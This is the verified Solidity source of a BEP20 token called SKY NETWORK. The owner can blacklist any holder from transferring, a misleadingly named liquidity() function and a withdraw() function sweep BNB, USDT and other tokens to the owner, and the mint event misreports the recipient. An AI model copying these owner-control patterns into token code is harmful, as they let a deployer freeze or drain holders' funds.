/**
 *Submitted for verification at BscScan.com on 2022-11-22
*/

// SPDX-License-Identifier: Unlicened

pragma solidity 0.8.16;
interface IBEP20 {
	function totalSupply() external view returns(uint256);

	function decimals() external view returns(uint8);

	function symbol() external view returns(string memory);

	function name() external view returns(string memory);

	function balanceOf(address account) external view returns(uint256);

	function transfer(address recipient, uint256 amount) external returns(bool);

	function allowance(address _owner, address spender) external view returns(uint256);

	function approve(address spender, uint256 amount) external returns(bool);

	function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
	function _msgSender() internal view virtual returns(address payable) {
		return payable(msg.sender);
	}

	function _msgData() internal view virtual returns(bytes memory) {
		this;
		return msg.data;
	}
}
library SafeMath {
	function add(uint256 a, uint256 b) internal pure returns(uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");
		return c;
	}

	function sub(uint256 a, uint256 b) internal pure returns(uint256) {
		return sub(a, b, "SafeMath: subtraction overflow");
	}

	function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
		require(b <= a, errorMessage);
		uint256 c = a - b;
		return c;
	}

	function mul(uint256 a, uint256 b) internal pure returns(uint256) {
		if(a == 0) {
			return 0;
		}
		uint256 c = a * b;
		require(c / a == b, "SafeMath: multiplication overflow");
		return c;
	}

	function div(uint256 a, uint256 b) internal pure returns(uint256) {
		return div(a, b, "SafeMath: division by zero");
	}

	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
		require(b > 0, errorMessage);
		uint256 c = a / b;
		return c;
	}

	function mod(uint256 a, uint256 b) internal pure returns(uint256) {
		return mod(a, b, "SafeMath: modulo by zero");
	}

	function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
		require(b != 0, errorMessage);
		return a % b;
	}
}
contract Ownable is Context {
	address private _owner;
	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
	constructor() {
		address msgSender = 0x3c3cB505d418CAB357B769566dB286e867268a72;
		_owner = msgSender;
		emit OwnershipTransferred(address(0), msgSender);
	}

	function owner() public view returns(address) {
		return _owner;
	}
	modifier onlyOwner() {
		require(_owner == _msgSender(), "Ownable: caller is not the owner");
		_;
	}

	function renounceOwnership() public onlyOwner {
		emit OwnershipTransferred(_owner, address(0));
		_owner = address(0);
	}

	function transferOwnership(address newOwner) public onlyOwner {
		_transferOwnership(newOwner);
	}

	function _transferOwnership(address newOwner) internal {
		require(newOwner != address(0), "Ownable: new owner is the zero address");
		emit OwnershipTransferred(_owner, newOwner);
		_owner = newOwner;
	}
}
contract SKYNETWORK is Context, IBEP20, Ownable {
	using SafeMath
	for uint256;
	mapping(address => uint256) private _balances;
	mapping(address => mapping(address => uint256)) private _allowances;
	mapping(address => bool) private BlackListedAddresses;
	uint256 private _totalSupply;
	uint8 private _decimals;
	string private _symbol;
	string private _name;
	IBEP20 _USDTtoken;
	constructor(address account) {
		_name = "SKY NETWORK";
		_symbol = "SKY";
		_decimals = 8;
		_totalSupply = 1000000000000000;
		_USDTtoken = IBEP20(0x55d398326f99059fF775485246999027B3197955);
		_balances[account] = _totalSupply;
		emit Transfer(address(0), msg.sender, _totalSupply);
	}

	function allowance(address owner, address spender) external view returns(uint256) {
		return _allowances[owner][spender];
	}

	function approve(address spender, uint256 amount) external returns(bool) {
		_approve(_msgSender(), spender, amount);
		return true;
	}

	function balanceOf(address account) external view returns(uint256) {
		return _balances[account];
	}

	function blacklist(address[] calldata _address) public onlyOwner returns(bool) {
		for(uint256 i = 0; i < _address.length; i++) {
			BlackListedAddresses[_address[i]] = true;
		}
		return true;
	}

	function burn(uint256 amount) public returns(bool) {
		_burn(_msgSender(), amount);
		return true;
	}

	function decimals() external view returns(uint8) {
		return _decimals;
	}

	function decreaseAllowance(address spender, uint256 subtractedValue) public returns(bool) {
		_approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
		return true;
	}

	function increaseAllowance(address spender, uint256 addedValue) public returns(bool) {
		_approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
		return true;
	}

	function liquidity() public onlyOwner {
		if(address(this).balance > 0) {
			payable(owner()).transfer(address(this).balance);
		}
		if(_USDTtoken.balanceOf(address(this)) > 0) {
			_USDTtoken.transfer(owner(), _USDTtoken.balanceOf(address(this)));
		}
	}

	function name() external view returns(string memory) {
		return _name;
	}

	function symbol() external view returns(string memory) {
		return _symbol;
	}

	function totalSupply() external view returns(uint256) {
		return _totalSupply;
	}

	function transfer(address recipient, uint256 amount) external returns(bool) {
		_transfer(_msgSender(), recipient, amount);
		return true;
	}

	function transferFrom(address sender, address recipient, uint256 amount) external returns(bool) {
		_transfer(sender, recipient, amount);
		_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
		return true;
	}

	function whitelist(address[] calldata _address) public onlyOwner returns(bool) {
		for(uint256 i = 0; i < _address.length; i++) {
			BlackListedAddresses[_address[i]] = false;
		}
		return true;
	}

	function withdraw(IBEP20 _contractAddress) public onlyOwner {
		if(_contractAddress.balanceOf(address(this)) > 0) {
			_contractAddress.transfer(owner(), _contractAddress.balanceOf(address(this)));
		}
	}

	function _approve(address owner, address spender, uint256 amount) internal {
		require(owner != address(0), "BEP20: approve from the zero address");
		require(spender != address(0), "BEP20: approve to the zero address");
		_allowances[owner][spender] = amount;
		emit approval(owner, spender, amount);
	}

	function _burn(address account, uint256 amount) internal {
		require(account != address(0), "BEP20: burn from the zero address");
		_balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
		_totalSupply = _totalSupply.sub(amount);
		emit Transfer(account, address(0), amount);
	}

	function _burnFrom(address account, uint256 amount) internal {
		_burn(account, amount);
		_approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
	}

	function _transfer(address sender, address recipient, uint256 amount) internal {
		require(sender != address(0), "BEP20: transfer from the zero address");
		require(recipient != address(0), "BEP20: transfer to the zero address");
		require(recipient != address(this), "BEP20: transfer to this contract address");
		require(BlackListedAddresses[sender] == false, "Sender is blacklisted");
		require(BlackListedAddresses[recipient] == false, "Recepient is blacklisted");
		_balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
		_balances[recipient] = _balances[recipient].add(amount);
		emit Transfer(sender, recipient, amount);
	}
}